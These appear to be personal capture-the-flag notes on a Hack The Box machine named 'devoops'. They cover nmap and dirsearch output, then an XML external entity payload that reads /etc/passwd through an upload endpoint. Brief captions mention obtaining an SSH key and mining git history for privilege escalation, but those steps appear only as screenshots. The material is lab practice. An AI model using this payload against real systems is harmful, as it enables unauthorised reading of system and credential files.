nmap
```
┌──(kali㉿kali)-[~/HTB/devoops]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.203.147
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 19:30 EST
Warning: 10.129.203.147 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.203.147
Host is up (0.046s latency).
Not shown: 64848 closed tcp ports (reset), 685 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   44.03 ms 10.10.14.1
2   44.23 ms 10.129.203.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.38 seconds
```

```
┌──(kali㉿kali)-[~/HTB/devoops]
└─$ dirsearch -u http://10.129.203.147:5000/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/devoops/reports/http_10.129.203.147_5000/__25-01-15_19-32-58.txt

Target: http://10.129.203.147:5000/

[19:32:58] Starting: 
[19:34:23] 200 -  533KB - /feed                                             
[19:35:43] 200 -  347B  - /upload                                           
                                                                             
Task Completed
```

![Pasted image 20250116083415](<0. Attachments/Pasted image 20250116083415.png>)

![Pasted image 20250116083607](<0. Attachments/Pasted image 20250116083607.png>)

example of xml-rss feed
![Pasted image 20250116085955](<0. Attachments/Pasted image 20250116085955.png>)

![Pasted image 20250116090157](<0. Attachments/Pasted image 20250116090157.png>)

payload to try
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "file:///etc/passwd">
]>
<item>
<Author>
  &bar;
</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>
</item>
```

![Pasted image 20250116094107](<0. Attachments/Pasted image 20250116094107.png>)
ID_RSA
![Pasted image 20250116094226](<0. Attachments/Pasted image 20250116094226.png>)

![Pasted image 20250116100157](<0. Attachments/Pasted image 20250116100157.png>)

Using git for priv esc finding things in GIT **VERY IMPORTANT**
![Pasted image 20250116100710](<0. Attachments/Pasted image 20250116100710.png>)

checking difference between commits
![Pasted image 20250116101000](<0. Attachments/Pasted image 20250116101000.png>)

resetting the commit
![Pasted image 20250116101119](<0. Attachments/Pasted image 20250116101119.png>)

![Pasted image 20250116101346](<0. Attachments/Pasted image 20250116101346.png>)
